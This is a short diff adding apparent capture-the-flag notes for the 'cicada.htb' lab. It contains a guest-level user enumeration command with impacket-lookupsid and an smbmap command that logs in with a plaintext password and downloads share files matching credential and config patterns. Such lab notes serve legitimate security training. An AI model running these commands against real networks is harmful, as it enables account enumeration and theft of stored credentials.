@@ -1,0 +1,5 @@
+# Extract Usernames
+impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt 
+
+#Rapid SMB share file search + Extraction
+smbmap -H 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -r -A '(pass|cred|config|\.kdbx|\.xml|\.ini|\.txt|\.ps1|\.bat)'
